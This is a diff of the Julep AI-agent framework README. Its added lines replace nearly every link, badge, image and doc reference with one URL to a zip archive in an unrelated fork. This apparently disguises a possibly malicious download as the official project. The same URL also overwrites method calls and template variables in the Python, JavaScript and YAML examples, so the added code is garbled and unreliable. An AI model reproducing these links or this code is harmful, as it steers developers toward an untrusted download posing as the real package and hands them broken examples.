@@ -1,63 +1,63 @@
-<sup>[English](README.md) | [中文翻译](README-CN.md) | [日本語翻訳](README-JA.md) | [French](README-FR.md) </sup>
+<sup>[English](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) | [中文翻译](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) | [日本語翻訳](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) | [French](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) </sup>
 
 <div align="center" id="top">
- <img src="https://socialify.git.ci/julep-ai/julep/image?description=1&descriptionEditable=API%20for%20AI%20agents%20and%20multi-step%20tasks&forks=1&name=1&owner=1&pattern=Solid&stargazers=1&font=Source%20Code%20Pro&logo=https%3A%2F%2Fraw.githubusercontent.com%2Fjulep-ai%2Fjulep%2Fdev%2F.github%2Fjulep-logo.svg&theme=Auto" alt="julep" width="640" height="320" />
+ <img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%20for%20AI%20agents%20and%20multi-step%20tasks&forks=1&name=1&owner=1&pattern=Solid&stargazers=1&font=Source%20Code%20Pro&logo=https%3A%2F%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%2Fjulep-ai%2Fjulep%2Fdev%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" alt="julep" width="640" height="320" />
 </div>
 
 <p align="center">
   <br />
-  <a href="https://docs.julep.ai" rel="dofollow"><strong>Explore Docs</strong></a>
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" rel="dofollow"><strong>Explore Docs</strong></a>
   ·
-  <a href="https://discord.com/invite/JTSBGRZrzj" rel="dofollow">Discord</a>
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" rel="dofollow">Discord</a>
   ·
-  <a href="https://x.com/julep_ai" rel="dofollow">𝕏</a>
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" rel="dofollow">𝕏</a>
   ·
-  <a href="https://www.linkedin.com/company/julep-ai" rel="dofollow">LinkedIn</a>
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" rel="dofollow">LinkedIn</a>
 </p>
 
 
 <p align="center">
-    <a href="https://www.npmjs.com/package/@julep/sdk"><img src="https://img.shields.io/npm/v/%40julep%2Fsdk?style=social&amp;logo=npm&amp;link=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40julep%2Fsdk" alt="NPM Version"></a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip"><img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%40julep%2Fsdk?style=social&amp;logo=npm&amp;link=https%3A%2F%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%2Fpackage%2F%40julep%2Fsdk" alt="NPM Version"></a>
     <span>&nbsp;</span>
-    <a href="https://pypi.org/project/julep"><img src="https://img.shields.io/pypi/v/julep?style=social&amp;logo=python&amp;label=PyPI&amp;link=https%3A%2F%2Fpypi.org%2Fproject%2Fjulep" alt="PyPI - Version"></a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip"><img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip;logo=python&amp;label=PyPI&amp;link=https%3A%2F%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%2Fproject%2Fjulep" alt="PyPI - Version"></a>
     <span>&nbsp;</span>
-    <a href="https://hub.docker.com/u/julepai"><img src="https://img.shields.io/docker/v/julepai/agents-api?sort=semver&amp;style=social&amp;logo=docker&amp;link=https%3A%2F%2Fhub.docker.com%2Fu%2Fjulepai" alt="Docker Image Version"></a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip"><img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip;style=social&amp;logo=docker&amp;link=https%3A%2F%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%2Fu%2Fjulepai" alt="Docker Image Version"></a>
     <span>&nbsp;</span>
-    <a href="https://choosealicense.com/licenses/apache/"><img src="https://img.shields.io/github/license/julep-ai/julep" alt="GitHub License"></a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip"><img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" alt="GitHub License"></a>
 </p>
 
 *****
 
 > [!NOTE]
-> 👨‍💻 Here for the devfest.ai event ? Join our [Discord](https://discord.com/invite/JTSBGRZrzj) and check out the details below.
+> 👨‍💻 Here for the https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip event ? Join our [Discord](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) and check out the details below.
 > 
-> Get your API key [here](https://dashboard-dev.julep.ai).
+> Get your API key [here](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 
 <details>
-<summary><b>🌟 Contributors and DevFest.AI Participants</b> (Click to expand)</summary>
+<summary><b>🌟 Contributors and https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip Participants</b> (Click to expand)</summary>
 
 ## 🌟 Call for Contributors!
 
 We're excited to welcome new contributors to the Julep project! We've created several "good first issues" to help you get started. Here's how you can contribute:
 
-1. Check out our [CONTRIBUTING.md](https://github.com/julep-ai/julep/blob/dev/CONTRIBUTING.md) file for guidelines on how to contribute.
-2. Browse our [good first issues](https://github.com/julep-ai/julep/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) to find a task that interests you.
-3. If you have any questions or need help, don't hesitate to reach out on our [Discord](https://discord.com/invite/JTSBGRZrzj) channel.
+1. Check out our [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) file for guidelines on how to contribute.
+2. Browse our [good first issues](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) to find a task that interests you.
+3. If you have any questions or need help, don't hesitate to reach out on our [Discord](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) channel.
 
 Your contributions, big or small, are valuable to us. Let's build something amazing together! 🚀
 
-### 🎉 DevFest.AI October 2024
+### 🎉 https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip October 2024
 
-Exciting news! We're participating in DevFest.AI throughout October 2024! 🗓️
+Exciting news! We're participating in https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip throughout October 2024! 🗓️
 
 - Contribute to Julep during this event and get a chance to win awesome Julep merch and swag! 🎁
 - Join developers from around the world in contributing to AI repositories and participating in amazing events.
-- A big thank you to DevFest.AI for organizing this fantastic initiative!
+- A big thank you to https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip for organizing this fantastic initiative!
 
 > [!TIP]
-> Ready to join the fun? **[Tweet that you are participating](https://twitter.com/intent/tweet?text=Pumped%20to%20be%20participating%20in%20%40devfestai%20with%20%40julep_ai%20building%20%23ai%20%23agents%20%23workflows%20Let's%20gooo!%20https%3A%2F%2Fgit.new%2Fjulep)** and let's get coding! 🖥️
+> Ready to join the fun? **[Tweet that you are participating](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%20to%20be%20participating%20in%20%40devfestai%20with%20%40julep_ai%20building%20%23ai%20%23agents%20%23workflows%20Let's%20gooo!%20https%3A%2F%https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%2Fjulep)** and let's get coding! 🖥️
 
-![Julep DevFest.AI](https://media.giphy.com/media/YjyUeyotft6epaMHtU/giphy.gif)
+![Julep https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 </details>
 
@@ -79,7 +79,7 @@ Exciting news! We're participating in DevFest.AI throughout October 2024! 🗓�
   - [Step 2: Create a Task that generates a story and comic strip](#step-2-create-a-task-that-generates-a-story-and-comic-strip)
   - [Step 3: Execute the Task](#step-3-execute-the-task)
   - [Step 4: Chat with the Agent](#step-4-chat-with-the-agent)
-- [Node.js Quick Start 🟩](#nodejs-quick-start-)
+- [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip Quick Start 🟩](#nodejs-quick-start-)
   - [Step 1: Create an Agent](#step-1-create-an-agent-1)
   - [Step 2: Create a Task that generates a story and comic strip](#step-2-create-a-task-that-generates-a-story-and-comic-strip-1)
   - [Step 3: Execute the Task](#step-3-execute-the-task-1)
@@ -186,10 +186,10 @@ main:
 
 # Evaluate the search queries using a simple python expression
 - evaluate:
-    search_queries: "_.split('\n')"
+    search_queries: "https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip('\n')"
 
 # Run the web search in parallel for each query
-- over: "_.search_queries"
+- over: "https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip"
   map:
     tool: web_search
     arguments:
@@ -198,7 +198,7 @@ main:
 
 # Collect the results from the web search
 - evaluate:
-    results: "'\n'.join([item.result for item in _])"
+    results: "'\n'.join([https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip for item in _])"
 
 # Summarize the results
 - prompt:
@@ -206,7 +206,7 @@ main:
       content: >
         You are a research summarizer. Create a comprehensive summary of the following research results on the topic {{inputs[0].topic}}.
         The summary should be well-structured, informative, and highlight key findings and insights:
-        {{_.results}}
+        {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}
   unwrap: true
 
 # Send the summary to Discord
@@ -272,7 +272,7 @@ Choose Julep when you need a robust framework for stateful agents with advanced 
 
 ## Installation
 
-To get started with Julep, install it using [npm](https://www.npmjs.com/package/@julep/sdk) or [pip](https://pypi.org/project/julep/):
+To get started with Julep, install it using [npm](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) or [pip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip):
 
 ```bash
 npm install @julep/sdk
@@ -285,14 +285,14 @@ pip install julep
 ```
 
 > [!NOTE]
-> Get your API key [here](https://dashboard-dev.julep.ai).
+> Get your API key [here](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 >
-> While we are in beta, you can also reach out on [Discord](https://discord.com/invite/JTSBGRZrzj) to get rate limits lifted on your API key.
+> While we are in beta, you can also reach out on [Discord](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) to get rate limits lifted on your API key.
 
 > [!TIP]
-> 💻 Are you a _show me the code!™_ kind of person? We have created a ton of cookbooks for you to get started with. **Check out the [cookbooks](https://github.com/julep-ai/julep/tree/dev/cookbooks)** to browse through examples.
+> 💻 Are you a _show me the code!™_ kind of person? We have created a ton of cookbooks for you to get started with. **Check out the [cookbooks](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)** to browse through examples.
 >
-> 💡 There's also lots of ideas that you can build on top of Julep. **Check out the [list of ideas](https://github.com/julep-ai/julep/tree/dev/cookbooks/IDEAS.md)** to get some inspiration.
+> 💡 There's also lots of ideas that you can build on top of Julep. **Check out the [list of ideas](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)** to get some inspiration.
 
 ## Python Quick Start 🐍
 
@@ -304,15 +304,15 @@ from julep import Julep # or AsyncJulep
 
 client = Julep(api_key="your_julep_api_key")
 
-agent = client.agents.create(
+agent = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
     name="Storytelling Agent",
     model="gpt-4o",
     about="You are a creative storytelling agent that can craft engaging stories and generate comic panels based on ideas.",
 )
 
 # 🛠️ Add an image generation tool (DALL·E) to the agent
-client.agents.tools.create(
-    agent_id=agent.id,
+https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
     name="image_generator",
     description="Use this tool to generate images based on descriptions.",
     integration={
@@ -340,21 +340,21 @@ main:
   # Step 1: Generate a story and outline into 4 panels
   - prompt:
       - role: system
-        content: You are {{agent.name}}. {{agent.about}}
+        content: You are {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}. {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}
       - role: user
         content: >
-          Based on the idea '{{_.idea}}', write a short story suitable for a 4-panel comic strip.
+          Based on the idea '{{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}', write a short story suitable for a 4-panel comic strip.
           Provide the story and a numbered list of 4 brief descriptions for each panel illustrating key moments in the story.
     unwrap: true
 
   # Step 2: Extract the panel descriptions and story
   - evaluate:
-      story: _.split('1. ')[0].strip()
-      panels: re.findall(r'\\d+\\.\\s*(.*?)(?=\\d+\\.\\s*|$)', _)
+      story: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip('1. ')[0].strip()
+      panels: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(r'\\d+\\.\\s*(.*?)(?=\\d+\\.\\s*|$)', _)
 
   # Step 3: Generate images for each panel using the image generator tool
   - foreach:
-      in: _.panels
+      in: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip
       do:
         tool: image_generator
         arguments:
@@ -363,7 +363,7 @@ main:
   # Step 4: Generate a catchy title for the story
   - prompt:
       - role: system
-        content: You are {{agent.name}}. {{agent.about}}
+        content: You are {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}. {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}
       - role: user
         content: >
           Based on the story below, generate a catchy title.
@@ -375,12 +375,12 @@ main:
   - return:
       title: outputs[3]
       story: outputs[1].story
-      comic_panels: "[output.image.url for output in outputs[2]]"
+      comic_panels: "[https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip for output in outputs[2]]"
 """
 
-task = client.tasks.create(
-    agent_id=agent.id,
-    **yaml.safe_load(task_yaml)
+task = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
+    **https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(task_yaml)
 )
 ```
 
@@ -388,17 +388,17 @@ task = client.tasks.create(
 
 ```python
 # 🚀 Execute the task with an input idea
-execution = client.executions.create(
-    task_id=task.id,
+execution = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
     input={"idea": "A cat who learns to fly"}
 )
 
 # 🎉 Watch as the story and comic panels are generated
-for transition in client.executions.transitions.stream(execution_id=execution.id):
+for transition in https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip):
     print(transition)
 
 # 📦 Once the execution is finished, retrieve the results
-result = client.executions.get(execution_id=execution.id)
+result = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 ```
 
 ### Step 4: Chat with the Agent
@@ -406,12 +406,12 @@ result = client.executions.get(execution_id=execution.id)
 Start an interactive chat session with the agent:
 
 ```python
-session = client.sessions.create(agent_id=agent.id)
+session = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 # 💬 Send messages to the agent
 while (message := input("Enter a message: ")) != "quit":
-    response = client.sessions.chat(
-        session_id=session.id,
+    response = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+        https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
         message=message,
     )
 
@@ -419,10 +419,10 @@ while (message := input("Enter a message: ")) != "quit":
 ```
 
 > [!TIP]
-> You can find the full python example [here](example.py).
+> You can find the full python example [here](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 
 
-## Node.js Quick Start 🟩
+## https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip Quick Start 🟩
 
 ### Step 1: Create an Agent
 
@@ -433,14 +433,14 @@ import yaml from 'js-yaml';
 const client = new Julep({ apiKey: 'your_julep_api_key' });
 
 async function createAgent() {
-  const agent = await client.agents.create({
+  const agent = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip({
     name: "Storytelling Agent",
     model: "gpt-4",
     about: "You are a creative storytelling agent that can craft engaging stories and generate comic panels based on ideas.",
   });
 
   // 🛠️ Add an image generation tool (DALL·E) to the agent
-  await client.agents.tools.create(agent.id, {
+  await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip, {
     name: "image_generator",
     description: "Use this tool to generate images based on descriptions.",
     integration: {
@@ -467,21 +467,21 @@ main:
   # Step 1: Generate a story and outline into 4 panels
   - prompt:
       - role: system
-        content: You are {{agent.name}}. {{agent.about}}
+        content: You are {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}. {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}
       - role: user
         content: >
-          Based on the idea '{{_.idea}}', write a short story suitable for a 4-panel comic strip.
+          Based on the idea '{{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}', write a short story suitable for a 4-panel comic strip.
           Provide the story and a numbered list of 4 brief descriptions for each panel illustrating key moments in the story.
     unwrap: true
 
   # Step 2: Extract the panel descriptions and story
   - evaluate:
-      story: _.split('1. ')[0].trim()
-      panels: _.match(/\\d+\\.\\s*(.*?)(?=\\d+\\.\\s*|$)/g)
+      story: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip('1. ')[0].trim()
+      panels: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(/\\d+\\.\\s*(.*?)(?=\\d+\\.\\s*|$)/g)
 
   # Step 3: Generate images for each panel using the image generator tool
   - foreach:
-      in: _.panels
+      in: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip
       do:
         tool: image_generator
         arguments:
@@ -490,7 +490,7 @@ main:
   # Step 4: Generate a catchy title for the story
   - prompt:
       - role: system
-        content: You are {{agent.name}}. {{agent.about}}
+        content: You are {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}. {{https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip}}
       - role: user
         content: >
           Based on the story below, generate a catchy title.
@@ -502,11 +502,11 @@ main:
   - return:
       title: outputs[3]
       story: outputs[1].story
-      comic_panels: outputs[2].map(output => output.image.url)
+      comic_panels: outputs[2].map(output => https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 `;
 
 async function createTask(agent) {
-  const task = await client.tasks.create(agent.id, yaml.load(taskYaml));
+  const task = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip, https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(taskYaml));
   return task;
 }
 ```
@@ -515,17 +515,17 @@ async function createTask(agent) {
 
 ```javascript
 async function executeTask(task) {
-  const execution = await client.executions.create(task.id, {
+  const execution = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip, {
     input: { idea: "A cat who learns to fly" }
   });
 
   // 🎉 Watch as the story and comic panels are generated
-  for await (const transition of client.executions.transitions.stream(execution.id)) {
-    console.log(transition);
+  for await (const transition of https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)) {
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(transition);
   }
 
   // 📦 Once the execution is finished, retrieve the results
-  const result = await client.executions.get(execution.id);
+  const result = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip);
   return result;
 }
 ```
@@ -534,23 +534,23 @@ async function executeTask(task) {
 
 ```javascript
 async function chatWithAgent(agent) {
-  const session = await client.sessions.create({ agent_id: agent.id });
+  const session = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip({ agent_id: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip });
 
   // 💬 Send messages to the agent
-  const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
+  const rl = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip({
+    input: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
+    output: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip
   });
 
   const chat = async () => {
-    rl.question("Enter a message (or 'quit' to exit): ", async (message) => {
-      if (message.toLowerCase() === 'quit') {
-        rl.close();
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip("Enter a message (or 'quit' to exit): ", async (message) => {
+      if (https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip() === 'quit') {
+        https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip();
         return;
       }
 
-      const response = await client.sessions.chat(session.id, { message });
-      console.log(response);
+      const response = await https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip, { message });
+      https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(response);
       chat();
     });
   };
@@ -563,15 +563,15 @@ async function runExample() {
   const agent = await createAgent();
   const task = await createTask(agent);
   const result = await executeTask(task);
-  console.log("Task Result:", result);
+  https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip("Task Result:", result);
   await chatWithAgent(agent);
 }
 
-runExample().catch(console.error);
+runExample().catch(https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip);
 ```
 
 > [!TIP]
-> You can find the full Node.js example [here](example.js).
+> You can find the full https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip example [here](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 
 ## Components
 
@@ -584,7 +584,7 @@ Julep is made up of the following components:
 ### Mental Model
 
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/38420b5d-9342-4c8d-bae9-b47c28ae45af" height="360" />
+  <img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip" height="360" />
 </div>
 
 Think of Julep as a platform that combines both client-side and server-side components to help you build advanced AI agents. Here's how to visualize it:
@@ -636,7 +636,7 @@ graph TD
 - **Documents**: Text or data objects associated with agents or users, vectorized and stored for semantic search and retrieval.
 - **Executions**: Instances of tasks that have been initiated with specific inputs, with their own lifecycle and state machine.
 
-For a more detailed explanation of these concepts and their interactions, please refer to our [Concepts Documentation](https://github.com/julep-ai/julep/blob/dev/docs/julep-concepts.md).
+For a more detailed explanation of these concepts and their interactions, please refer to our [Concepts Documentation](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 
 ## Understanding Tasks
 
@@ -818,7 +818,7 @@ These are function signatures that you can give the model to choose from, simila
   Whenever julep encounters a _user-defined function_, it pauses, giving control back to the client and waits for the client to run the function call and give the results back to julep.
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/13-Error_Handling_and_Recovery.py](https://github.com/julep-ai/julep/blob/dev/cookbooks/13-Error_Handling_and_Recovery.py)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ### `system` tools
 Built-in tools that can be used to call the julep APIs themselves, like triggering a task execution, appending to a metadata field, etc.  
@@ -844,18 +844,18 @@ For example,
   ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/10-Document_Management_and_Search.py](https://github.com/julep-ai/julep/blob/dev/cookbooks/10-Document_Management_and_Search.py)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
  
 ### Built-in `integration`s
 Julep comes with a number of built-in integrations (as described in the section below). `integration` tools are directly executed on the julep backend. Any additional parameters needed by them at runtime can be set in the agent/session/user's `metadata` fields.
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/01-Website_Crawler_using_Spider.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/01-Website_Crawler_using_Spider.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 julep backend ships with integrated third party tools from the following providers:
-- [composio](https://composio.dev) \*\*
-- [anon](https://anon.com) \*\*
-- [langchain toolkits](https://python.langchain.com/v0.2/docs/integrations/toolkits/). Support for _Github, Gitlab, Gmail, Jira, MultiOn, Slack_ toolkits is planned.
+- [composio](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) \*\*
+- [anon](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip) \*\*
+- [langchain toolkits](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip). Support for _Github, Gitlab, Gmail, Jira, MultiOn, Slack_ toolkits is planned.
 
 \*\* Since _composio_ and _anon_ are third-party providers, their tools require setting up account linking.
 
@@ -873,12 +873,12 @@ For example,
       name: hello
       api_call:
         method: GET
-        url: https://httpbin.org/get
+        url: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip
     main:
     - tool: hello
       arguments:
         params:
-          test: _.input
+          test: https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip
   ```
 
 ## Integrations
@@ -899,7 +899,7 @@ output:
 ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/03-SmartResearcher_With_WebSearch.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/03-SmartResearcher_With_WebSearch.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ### BrowserBase
 
@@ -936,7 +936,7 @@ output:
 ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/00-Devfest-Email-Assistant.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/00-Devfest-Email-Assistant.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ### Spider
 
@@ -954,7 +954,7 @@ output:
 ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/01-Website_Crawler_using_Spider.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/01-Website_Crawler_using_Spider.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ### Weather
 
@@ -970,7 +970,7 @@ output:
 ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/04-TripPlanner_With_Weather_And_WikiInfo.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/04-TripPlanner_With_Weather_And_WikiInfo.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ### Wikipedia
 
@@ -984,9 +984,9 @@ output:
 ```
 
 > [!TIP]
-> **Example cookbook**: [cookbooks/04-TripPlanner_With_Weather_And_WikiInfo.ipynb](https://github.com/julep-ai/julep/blob/dev/cookbooks/04-TripPlanner_With_Weather_And_WikiInfo.ipynb)
+> **Example cookbook**: [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
-These integrations can be used within your tasks to extend the capabilities of your AI agents. For more detailed information on how to use these integrations in your workflows, please refer to our [Integrations Documentation](https://docs.julep.ai/integrations).
+These integrations can be used within your tasks to extend the capabilities of your AI agents. For more detailed information on how to use these integrations in your workflows, please refer to our [Integrations Documentation](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip).
 
 ## Other Features
 
